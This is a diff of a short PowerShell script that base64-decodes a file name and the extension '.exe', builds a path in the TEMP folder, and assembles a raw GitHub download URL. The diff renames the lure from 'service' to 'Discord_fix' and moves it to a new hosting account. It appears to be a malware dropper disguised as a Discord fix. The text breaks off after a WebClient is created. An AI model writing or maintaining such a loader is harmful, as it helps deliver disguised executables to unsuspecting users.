@@ -1,9 +1,9 @@
-$n = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VydmljZQ=='))
+$n = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RGlzY29yZF9maXg='))
 $x = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('LmV4ZQ=='))
 $p = [IO.Path]::Combine($env:TEMP, $n + $x)
 
-$a = 'https://github.com/matvejsklarov9-cyber/'
-$b = 'my/raw/refs/heads/main/'
+$a = 'https://github.com/iendjd7-lgtm/-froggyproject/'
+$b = 'raw/refs/heads/main/'
 $u = $a + $b + $n + $x
 
 $wc = New-Object System.Net.WebClient
